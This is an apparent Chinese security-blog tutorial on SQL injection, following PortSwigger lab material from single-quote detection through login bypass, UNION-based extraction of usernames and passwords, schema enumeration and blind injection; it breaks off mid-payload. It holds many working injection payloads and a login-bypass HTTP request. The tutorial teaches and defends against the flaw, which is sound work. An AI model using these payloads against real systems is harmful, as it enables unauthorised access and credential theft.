---
title: SQL 注入到底是怎么操作的？
url: https://mp.weixin.qq.com/s/OSQrob5TZbVTt9U6YJ7ohA
source: Doonsec's feed
date: 2026-09-30
fetch_date: 2026-10-01T07:57:11.827033
---

# SQL 注入到底是怎么操作的？

# SQL 注入到底是怎么操作的？

原创

钟智强
钟智强

哪吒网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

WEB SECURITY LAB  ·  ISSUE 01

SQL 注入到底是怎么操作的？

从一颗单引号，到整张用户表被拖走的完整过程

|  |  |  |  |
| --- | --- | --- | --- |
| 难度 | 阅读时长 | 配图 | 代码段 |
| 入门 → 进阶 | 约 15 分钟 | 12 张示意图 | 47 段 payload |

 原理拆解    手工实操    靶场路线    防御清单    合规声明

本文内容体系参照 PortSwigger Web Security Academy 的 SQL 注入教学主线编写，所有示例均来自其公开教学材料与官方靶场，用于帮助读者理解漏洞原理与防御设计。

本 文 导 航

|  |  |
| --- | --- |
| 章节 | 一句话要点 |
| 01  心智模型 | 注入的本质是「数据被当成代码」 |
| 02  第一颗扣子 | 一个单引号如何改写整条 SQL |
| 03  实战一 | 检索隐藏数据与登录绕过 |
| 04  实战二 | UNION 攻击：把别的表拼进结果 |
| 05  实战三 | 侦察数据库：版本 → 表名 → 列名 |
| 06  实战四 | 盲注：用「是 / 否」把数据问出来 |
| 07  实战五 | 时间盲注：用秒表代替眼睛 |
| 08  实战六 | OAST：让数据库主动找你 |
| 09  进阶 | 二阶注入：危险输入会「复活」 |
| 10  方言差异 | 为什么换个数据库 payload 就失效 |
| 11  防御 | 参数化查询为什么能一劳永逸 |
| 12  靶场路线 | 从 Apprentice 到 Expert 的练习顺序 |

![](https://mmbiz.qpic.cn/mmbiz_png/ia7TorzX5Pa2uN4mw1s3fstoJnBFCpLD6Jyap1gfuBNFqFqv9pZF210c0yiaYtLzthhEgSQ9tXId9dESD9MzRtdA11cssx8UTRA3IOg6GClA0/640?wx_fmt=png)

图 1：SQL 注入的完整攻击链——输入可控、拼接进 SQL、语法被改写、查询语义变化、响应出现差分、数据被读出

# 写在前面：别背 payload，要理解语义

绝大多数介绍 SQL 注入的文章，最后都会变成一份 payload 清单：' OR 1=1--、UNION SELECT、SLEEP(10)……读者背了一堆咒语，换个数据库、换个上下文，立刻失效。

PortSwigger（Burp Suite 的开发商）的 SQL 注入课程之所以被公认为最好的入门材料，恰恰是因为它不教咒语。它的教学主线是一条严密递进的推理链：

·输入是怎么进入 SQL 语句结构的？（语法边界）

·语法被改写后，查询语义发生了什么变化？（布尔逻辑）

·结果看得到时，怎么把别的表的数据一起带出来？（UNION）

·结果看不到时，怎么把数据一个比特一个比特地问出来？（盲注）

·不同数据库的方言差异，会让同一个 payload 失效在哪里？（语法映射）

·最后回到根本：什么样的写法才不会被注入？（参数化）

本文就沿着这条线，把每一步都拆开讲清楚，并配上 12 张示意图。看完你应该能回答一个问题：给我一个输入框，我该怎么一步步判断它能不能注入、能注入到什么程度。

 合规 │ 本文所有示例均出自 PortSwigger 官方教学材料与受控靶场，仅用于漏洞原理学习与防御设计。对任何不属于自己的系统进行测试，都必须事先取得明确书面授权；未经授权扫描或利用他人系统，在中国《网络安全法》《刑法》第 285 条等法律框架下均可能构成违法。请只在靶场里练手。

# 01   心智模型：注入的本质是「数据被当成代码」

PortSwigger 对 SQL 注入的定义是：一种允许攻击者干扰应用程序发往数据库的查询的 Web 安全漏洞。它可以让攻击者读到本不该看到的数据，在一定条件下还能修改删除数据、绕过应用逻辑、提升权限，甚至进一步攻陷后端基础设施。

请注意定义里的关键词——「干扰查询」。注入的本质不是「让页面报错」，而是不可信输入进入了 SQL 的语句结构层，改变了查询的语义。

一个正常的查询里，用户输入应该只作为一个字符串值参与比较：

SELECT \* FROMproductsWHEREcategory = 'Gifts'ANDreleased = 1

这里的 Gifts 是数据，其余部分是指令。但一旦用户输入里出现单引号、注释符、括号或 SQL 关键字，数据就变成了指令的一部分——这就是注入。

## 注入点不止在 URL

很多人以为注入只发生在地址栏。实际上，任何最终会被拼进 SQL 的位置都算入口：

·URL 查询参数：?category=Gifts、?id=13

·表单字段：登录框、搜索框、筛选条件

·Cookie：比如 TrackingId 被拿去做「老用户识别」

·HTTP 头：User-Agent、X-Forwarded-For（常被写进日志再被查询）

·文件上传内容 / 反序列化字段

·二阶场景：先存进数据库，之后被另一个功能读出来再拼 SQL

## 唯一可信的判断方法：差分实验

确认注入点的最低标准，是能「可重复地改变查询语义」。所以正确的做法是做对比实验，而不是看到 500 错误就下结论：

·先记录基线：正常输入的响应状态、长度、耗时、页面文案

·改一个变量：加一个引号，看是否异常；再闭合它，看是否恢复

·真假对照：提交等价条件与不等价条件，比较两次响应

·排除干扰：缓存、会话、限流、WAF 拦截都可能造成假阳性

 要点 │ 单独一次的报错、延时或被 WAF 拦截，都不能证明存在 SQL 注入。只有当「真条件」和「假条件」产生稳定、可复现的差异时，才构成有效证据。

# 02   第一颗扣子：一个单引号如何改写 SQL

![](https://mmbiz.qpic.cn/mmbiz_png/ia7TorzX5Pa07nhrBZNsLpw9BDRkhhekuVscpwsnhauibaD9EBic5H0v7JhBCcHpSiapStmicmSIpeE0qTCeNpIbufJU4TDdpj3yV9CgMn5vsbo4/640?wx_fmt=png)

图 2：原始查询、注入输入、实际执行语句的对照——-- 把业务约束整段注释掉

假设某电商站点按类别展示商品，并且只显示已发布的商品（released = 1）。后端语句大致是：

原始语句

SELECT \* FROMproductsWHEREcategory = 'Gifts'ANDreleased = 1

现在攻击者在类别参数里提交这样一个值：

Gifts'--

于是数据库真正执行的是：

SELECT \* FROM products WHERE category = 'Gifts'--' AND released = 1

这里发生了两件事：

·单引号 ' 提前闭合了原本包住用户输入的那对引号，让后面的内容变成 SQL 代码

·-- 是 SQL 的行注释符，它把后面原本的 ' AND released = 1 整段注释掉了

结果：用于隐藏未发布商品的业务约束被删除，未发布的商品全部出现在页面上。这就是 PortSwigger 靶场第一关「retrieval of hidden data」的全部原理。

 记住 │ 记住这个模型：攻击者的目标从来不是「让语句报错」，而是让报错后的合法语句，恰好表达出一个越权的查询条件。

## 检测阶段的标准 payload 组合

在不确定的时候，可以按这四组思路做差分测试：

# 1. 引号异常 → 闭合恢复
Gifts'          页面异常 / 500
Gifts''         页面恢复正常（两个引号重新配对）

# 2. 真假条件对照
' OR '1'='1     条件恒真 → 返回更多数据
' OR '1'='2     条件恒假 → 与基线一致

# 3. 字符串拼接探测（不同数据库写法不同）
'||'ab          Oracle / PostgreSQL
' 'ab           MySQL（两个字符串之间有空格）
'+'ab           MicrosoftSQLServer

# 4. 时间型探测（真假两条都要测）
'; SELECTpg\_sleep(10)--       PostgreSQL
'; SELECTSLEEP(10)--          MySQL

# 03   实战一：检索隐藏数据 与 登录绕过

理解了引号闭合，第一个实战就非常好懂。

## 跨类别查看：OR 1=1

如果不想只去掉 released 条件，而是想看所有类别的所有商品，就加一个恒真条件：

https://insecure-website.com/products?category=Gifts'+OR+1=1--

SELECT \* FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

因为 1=1 恒真，OR 运算让整个 WHERE 条件恒真，查询返回的范围随之扩大。这里的 OR 1=1 不是什么神秘口令，就是布尔代数在 WHERE 子句里的直接利用。

 警告 │ PortSwigger 特别提醒：如果这个参数后续会进入 UPDATE 或 DELETE 语句，同样的 OR 1=1 可能导致全表被更新或删除。所以在真实授权测试中，使用这类 payload 要极其谨慎。

![](https://mmbiz.qpic.cn/mmbiz_png/ia7TorzX5Pa1kwOglI5XRDIqDVkjL84nBoQDSiaAZ6Dj5NsnpyXDod7Rx1NHb9AIRpdicckb1Omfc8bfZGQ8o2aJ9LoZAtXe5IMOQkjqmicVKIo/640?wx_fmt=png)

图 3：把 administrator'-- 填进用户名字段，密码校验条件被注释掉

## 登录绕过：把密码校验「注释」掉

假设登录逻辑执行的是这样一条查询，查到记录就算登录成功：

SELECT \* FROMusersWHEREusername = 'wiener'ANDpassword = 'bluecheese'

攻击者把用户名填成 administrator'--，密码留空，语句变成：

SELECT \* FROM users WHERE username = 'administrator'--' AND password = ''

-- 之后的内容全部失效，生效的条件只剩 username = 'administrator'。应用查到了管理员记录，于是直接以管理员身份登录。

把这个思路落到 HTTP 请求上，就是这样：

POST /loginHTTP/1.1
Host: example.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=8fJ2xK...&username=administrator'--&password=

 提示 │ 要向读者澄清一点：这个例子依赖的是一个非常脆弱的模型——明文比较密码、且「查到一条记录」就被直接当作身份验证通过。现实中如果密码用了哈希存储、结果还需二次校验，绕过不会这么直接。

# 04   实战二：UNION 攻击，把别的表「拼」进来

前面只是让原查询返回更多行。真正的杀伤力来自 UNION——它能为原查询「追加」一段全新的查询结果，从而读取完全不相干的表。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ia7TorzX5Pa3xDFzCMpKENnfqmvRtqQJnF05CdibLac4ssPQhQvsjibLN1ia2VHyf18IiccAibIKjdMUUJGGsdfZOgGFfudCp0pStVfgvXX6tj5Hs/640?wx_fmt=png)

图 4：UNION 像是给原查询挂上另一节车厢，车厢数与装载规格必须一致

UNION 有三条硬规则，缺一不可：

·两条 SELECT 的列数必须相同

·对应列的数据类型必须兼容

·合并后的结果必须能在页面上显示出来（回显）

## 第一步：数出原查询返回几列

有两种方法，各有适用场景。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ia7TorzX5Pa0JUN4dBP1zBUO1Z6UX5VrBhRsvej3Z19Bhpn4mQmxsPMXbpEib5951uYlKXlx2W06giacn9EzFPpZ1kugj93Ce6tVlqm97UhNNo/640?wx_fmt=png)

图 5：先用 ORDER BY 或 UNION SELECT NULL 定出列数，再逐列找出能显示文本的列

方法 A 是 ORDER BY 递增试探。ORDER BY 可以按「位置」引用列，不需要知道列名，当索引超过实际列数时，数据库会报错或响应发生变化：

' ORDERBY1--
' ORDERBY2--
' ORDERBY3--
' ORDER BY 4--   ← 报错

方法 B 是 UNION SELECT NULL 递增。NULL 能兼容绝大多数类型，列数对得上时就能正常返回：

' UNIONSELECTNULL--            报错
' UNIONSELECTNULL,NULL--       报错
' UNION SELECT NULL,NULL,NULL--  正常回显

## 第二步：找出哪一列能显示文本

知道列数之后，逐列放入同一个标记字符串，看哪一列会把值显示出来：

' UNION SELECT 'a',NULL,NULL--     页面无 'a'
' UNION SELECT NULL,'a',NULL--     页面出现 'a'  ← 这一列可用
' UNION SELECT NULL,NULL,'a'--     页面无 'a'

## 第三步：换成真正想要的字段

' UNIONSELECTNULL, username, password, NULLFROMusers--

账号和密码就这样混在商品列表里显示出来了。如果只有一个回显列可用，就把多个字段拼成一个字符串，中间加个分隔符：

' UNION SELECT username || '~' || password FROM users--   -- Oracle
' UNION SELECT CONCAT(username, '~', password) FROMusers--   -- MySQL

页面会显示类似 administrator~s3cure、wiener~peter 这样的结果。

 警告 │ 两个最容易翻车的细节：Oracle 的每个 SELECT 都必须带 FROM，所以要写成 ' UNION SELECT NULL FROM DUAL--；MySQL 的 -- 后面必须跟一个空格，或者直接改用 # 作为注释符。

# 05   实战三：侦察数据库，从版本到表结构

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ia7TorzX5Pa2XVewkxTjwWTNoQm0C4LVOLzruDjJE9T73acic2IUVx5nz0ICmngTGzUOdeDOTlqdkqdHy5taE3BrOmv5j3fHic4f9OEtkCkuA4/640?wx_fmt=png)

图 6：类型与版本 → 表名 → 列名 → 数据，顺序不能乱

能 UNION 回显之后，就可以开始系统性地摸清数据库结构了。顺序建议固定为：数据库类型 → 版本 → 表名 → 列名 → 数据。

## 先判断数据库类型与版本

' UNION SELECT @@version--            -- Microsoft SQL Server / MySQL
' UNIONSELECTversion()--           -- PostgreSQL
' UNIONSELECTbannerFROMv$version--   -- Oracle

## 再枚举表名与列名

除 Oracle 外，绝大多数数据库都提供 information\_schema 这套视图：

SELECT \* FROMinformation\_schema.tables;
SELECT \* FROMinformation\_schema.columnsWHEREtable\_name = 'Users';

Oracle 用自己的数据字典视图，注意对象名通常是大写：

SELECT \* FROMall\_tables;
SELECT \* FROMall\_tab\_columnsWHEREtable\_name = 'USERS';

 提示 │ 很多新手会直接猜 username、password 这两个字段名。正确做法是先用系统视图把列名查出来，再构造最终查询——这就是为什么侦察顺序必须排在取数之前。

# 06   实战四：盲注——页面什么都不显示怎么办

盲注并不是数据库没执行你的注入，而是应用既不回显查询结果、也不显示详细错误。这时候要把「读取数据」这件事，翻译成一连串的「是 / 否」问答。

共同模型非常朴素：一次请求 = 一个问题 = 一个比特。

![](https://mmbiz.qpic.cn/mmbiz_png/ia7TorzX5Pa20UKBjLVrAVsAzwtn2W6uqHogUGPaZibtKvMbASUGeDft3GFianU7ndHP2ByceXnwEX01adcHIdVOzO8E96YBRicMYsfOhp7zgMM/640?wx_fmt=png)

图 7：条件响应、条件错误、时间延迟、OAST 带外——四种把数据「问」出来的方式

## ① 条件响应（Boolean-based）

假设有个 Cookie 值 TrackingId 被拿去查询，用它来识别老用户并显示「欢迎回来」：

TrackingId=xyz' AND '1'='1     → 出现「Welcome back」
TrackingId=xyz' AND '1'='2     → 没有欢迎语

两次响应有稳定差异，说明注入的条件确实进入了查询。接下来把恒真条件换成具体的字符判断：

TrackingId=xyz' AND (SELECT CASE WHEN (Username = 'Administ...